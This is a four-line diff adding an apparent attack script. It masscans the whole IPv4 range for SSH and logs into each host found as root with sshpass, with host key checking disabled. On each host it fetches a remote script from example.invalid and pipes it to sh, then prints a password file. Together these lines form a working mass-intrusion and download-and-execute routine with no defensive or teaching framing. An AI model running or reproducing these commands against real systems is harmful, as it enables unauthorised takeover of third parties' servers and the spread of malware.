@@ -1,0 +1,4 @@
+masscan -p22 0.0.0.0/0 --rate 1000 -oL out.txt
+while read ip; do sshpass -p "$pw" ssh -o StrictHostKeyChecking=no root@$ip "wget http://example.invalid/a.sh -O- | sh"; done < ips.txt
+cat pass.txt
+
